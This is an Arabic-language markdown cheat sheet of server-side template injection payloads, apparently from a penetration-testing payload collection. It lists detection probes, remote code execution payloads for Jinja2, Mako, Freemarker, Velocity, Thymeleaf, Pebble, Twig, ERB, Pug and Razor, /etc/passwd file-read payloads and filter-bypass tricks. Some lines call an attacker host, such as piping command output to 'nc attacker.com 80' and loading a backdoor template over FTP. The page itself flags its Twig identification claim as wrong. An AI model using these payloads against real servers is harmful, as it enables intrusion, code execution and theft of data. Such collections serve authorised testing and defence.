<a id="-ssti-payloads-collection"></a>
# 🔥 مجموعة حمولات حقن قوالب الخادم (SSTI)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

> **تصحيح للمصدر:** لا يصح جمع Jinja2 وTwig تحت نتيجة واحدة للتعبير `{{7*'7'}}`؛ عامل `*` في Twig عامل ضرب، وليس تكرار سلسلة مثل Python. بقيت النتائج المنقولة في الأمثلة كما وردت لتمييزها، ولا تكفي وحدها لتحديد المحرك. كذلك تتأثر الحمولات بإصدار المحرك وإعدادات العزل؛ فهارس الأصناف الثابتة في أمثلة Python ليست قيمًا عامة. [توثيق معاملات Twig](https://twig.symfony.com/doc/3.x/templates.html#math).

---

<a id="-detection-payloads"></a>
## 🔍 حمولات الكشف

<a id="universal-detection"></a>
### الكشف العام
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> ظهور `49` في الاستجابة مؤشر محتمل على حقن قوالب الخادم (SSTI).

<a id="identify-template-engine"></a>
### تحديد محرك القوالب
```
{{7*'7'}}         → Jinja2/Twig returns 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

<a id="-python-jinja2"></a>
## 🐍 Python (Jinja2)

<a id="detection"></a>
### الكشف
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

<a id="rce-payloads"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```python
# الطريقة 1 - config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# الطريقة 2 - cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# الطريقة 3 - MRO (الأكثر شيوعًا)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# الطريقة 4 - lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# الطريقة 5 - Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

<a id="read-files"></a>
### قراءة الملفات
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

<a id="filter-bypass"></a>
### تجاوز المرشحات
```python
# استخدام المرشح attr
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# استخدام المرشح join  
{%set x=''|join('')|attr('__class__')%}

# الترميز الست عشري
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

<a id="-python-mako"></a>
## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

<a id="-java-freemarker"></a>
## ☕ Java (Freemarker)

<a id="detection-1"></a>
### الكشف
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

<a id="rce-payloads-1"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

<a id="-java-velocity"></a>
## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

<a id="simple"></a>
### بسيط
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

<a id="-java-thymeleaf"></a>
## 🌱 Java (Thymeleaf)

<a id="detection-2"></a>
### الكشف
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

<a id="rce-payloads-2"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

<a id="-java-pebble"></a>
## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

<a id="-php-twig"></a>
## 🐦 PHP (Twig)

<a id="detection-3"></a>
### الكشف
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

<a id="rce-payloads-3"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

<a id="read-files-1"></a>
### قراءة الملفات
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

<a id="-ruby-erb"></a>
## 💎 Ruby (ERB)

<a id="detection-4"></a>
### الكشف
```ruby
<%= 7*7 %>
<%= self %>
```

<a id="rce-payloads-4"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

<a id="-nodejs-jadepug"></a>
## 🟢 Node.js (Jade/Pug)

<a id="detection-5"></a>
### الكشف
```javascript
#{7*7}
-var x = 1; p= x
```

<a id="rce-payloads-5"></a>
### حمولات تنفيذ الشيفرة عن بُعد (RCE)
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

<a id="-net-razor"></a>
## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

| محرك القوالب | الكشف | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="blocked-keywords"></a>
### الكلمات المفتاحية المحظورة
```python
# استخدام وسائط الطلب
{{request.args.cmd}}?cmd=__class__

# ربط السلاسل النصية
{{''['__cla'+'ss__']}}

# الترميز الست عشري
{{''['\x5f\x5fclass\x5f\x5f']}}
```

<a id="blocked-brackets"></a>
### الأقواس المحظورة
```python
{%print(7*7)%}
```

---

<a id="-resources"></a>
## 📚 مصادر

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 ترسانة حمولات SSTI</b><br>
  <i>للأغراض التعليمية فقط!</i>
</p>
